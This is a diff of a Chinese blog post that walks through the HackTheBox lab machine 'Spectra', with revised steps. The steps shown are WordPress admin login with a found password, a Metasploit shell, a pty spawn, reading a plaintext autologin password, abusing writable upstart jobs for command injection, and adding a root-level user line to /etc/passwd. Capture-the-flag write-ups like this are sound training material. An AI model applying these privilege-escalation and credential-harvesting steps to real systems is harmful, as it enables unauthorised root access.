@@ -36,15 +36,16 @@
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/6.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/7.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Spectra/16.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/9.png">
-<meta property="og:image" content="http://evilarsene.icu/images/Spectra/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Spectra/17.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/11.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/12.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/13.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/14.png">
 <meta property="og:image" content="http://evilarsene.icu/images/Spectra/15.png">
 <meta property="article:published_time" content="2021-02-28T14:02:53.000Z">
-<meta property="article:modified_time" content="2021-05-07T15:43:01.306Z">
+<meta property="article:modified_time" content="2021-07-03T17:18:33.212Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
@@ -238,7 +239,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-07 23:43:01" itemprop="dateModified" datetime="2021-05-07T23:43:01+08:00">2021-05-07</time>
+                <time title="修改时间：2021-07-04 01:18:33" itemprop="dateModified" datetime="2021-07-04T01:18:33+08:00">2021-07-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -282,7 +283,7 @@
 <p><img src="/images/Spectra/6.png" alt="6"></p>
 <p>所以当我尝试<code>Administrator/devteam01</code>，成功登录</p>
 <p><img src="/images/Spectra/7.png" alt="7"></p>
-<p>wordpress管理员获取shell方法已经做了很多，多种方法可以参考靶场Mr-Robot-1</p>
+<p>wordpress管理员获取shell方法已经做了很多，多种方法可以参考<code>vulnhub:Mr-Robot-1</code></p>
 <p>这里就直接msf了</p>
 <p><img src="/images/Spectra/8.png" alt="8"></p>
 <p>成功获取shell</p>
@@ -290,27 +291,26 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;osrelease</span><br></pre></td></tr></table></figure>
 
 <p>好像是chrome os</p>
-<p>有python可以得到pty</p>
+<p><img src="/images/Spectra/16.png" alt="16"></p>
+<p>有python可以得到pty，但需要手动指定完整路径，不然出现奇怪的错误(感觉上是php meterpreter的锅)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/images/Spectra/9.png" alt="9"></p>
-<p>不知道为什么，无法运行shell脚本，只能手动枚举</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh .&#x2F;test.sh</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: Refusing to exec .&#x2F;test.sh from noexec mount; see https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromiumos&#x2F;docs&#x2F;+&#x2F;master&#x2F;security&#x2F;noexec_shell_scripts.md</span><br></pre></td></tr></table></figure>
-
-<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>手动枚举发现了/opt/autologin.conf.orig</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span><br><span class="line"># Use of this source code is governed by a BSD-style license that can be</span><br><span class="line"># found in the LICENSE file.</span><br><span class="line">description   &quot;Automatic login at boot&quot;</span><br><span class="line">author        &quot;chromium-os-dev@chromium.org&quot;</span><br><span class="line"># After boot-complete starts, the login prompt is visible and is accepting</span><br><span class="line"># input.</span><br><span class="line">start on started boot-complete</span><br><span class="line">script</span><br><span class="line">  passwd&#x3D;</span><br><span class="line">  # Read password from file. The file may optionally end with a newline.</span><br><span class="line">  for dir in &#x2F;mnt&#x2F;stateful_partition&#x2F;etc&#x2F;autologin &#x2F;etc&#x2F;autologin; do</span><br><span class="line">    if [ -e &quot;$&#123;dir&#125;&#x2F;passwd&quot; ]; then</span><br><span class="line">      passwd&#x3D;&quot;$(cat &quot;$&#123;dir&#125;&#x2F;passwd&quot;)&quot;</span><br><span class="line">      break</span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">  if [ -z &quot;$&#123;passwd&#125;&quot; ]; then</span><br><span class="line">    exit 0</span><br><span class="line">  fi</span><br><span class="line">  # Inject keys into the login prompt.</span><br><span class="line">  #</span><br><span class="line">  # For this to work, you must have already created an account on the device.</span><br><span class="line">  # Otherwise, no login prompt appears at boot and the injected keys do the</span><br><span class="line">  # wrong thing.</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;inject-keys.py -s &quot;$&#123;passwd&#125;&quot; -k enter</span><br></pre></td></tr></table></figure>
-
-<p>发现了凭据保存位置/etc/autologin/</p>
-<p><img src="/images/Spectra/10.png" alt="10"></p>
-<p>所以登录凭据为SummerHereWeCome!!</p>
-<p>检查/etc/passwd，发现用户katie</p>
+<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>发现了<code>/etc/autologin/passwd</code>里的密码<code>SummerHereWeCome!!</code></p>
+<p><img src="/images/Spectra/17.png" alt="17"></p>
+<p>检查<code>/etc/passwd</code>，发现用户<code>katie</code></p>
 <p><img src="/images/Spectra/11.png" alt="11"></p>
 <h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><img src="/images/Spectra/12.png" alt="12"></p>
-<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/8/initctl">https://linux.die.net/man/8/initctl</a></p>
-<p><a target="_blank" rel="noopener" href="http://upstart.ubuntu.com/getting-started.html">http://upstart.ubuntu.com/getting-started.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -writable</span><br></pre></td></tr></table></figure>
+<p>关于initctl可以参考:</p>
+<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/8/initctl">https://linux.die.net/man/8/initctl</a><br><a target="_blank" rel="noopener" href="http://upstart.ubuntu.com/getting-started.html">http://upstart.ubuntu.com/getting-started.html</a></p>
+<p>作业被存放在<code>/etc/init</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;init</span><br><span class="line">find . -type f -writable</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/Spectra/13.png" alt="13"></p>
-<p>我用ping命令尝试命令注入是否成功执行，在确认执行之后</p>
-<p>我将<code>suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::/root:/bin/bash</code>注入到了/etc/passwd</p>
+<p>这些文件可以写是因为当前用户处于<code>developers</code>组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-bash-4.3$ groups</span><br><span class="line">katie developers</span><br><span class="line"></span><br><span class="line">-bash-4.3$ ls -l test.conf</span><br><span class="line">-rw-rw---- 1 root developers 478 Jun 29  2020 test.conf</span><br></pre></td></tr></table></figure>
+
+<p>我用ping命令尝试命令注入是否成功执行，在确认执行之后，我将<code>suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::/root:/bin/bash</code>注入到了<code>/etc/passwd</code></p>
 <p><img src="/images/Spectra/14.png" alt="14"></p>
 <p>最后</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh suser@spectra.htb</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>
@@ -415,14 +415,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-count">170</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
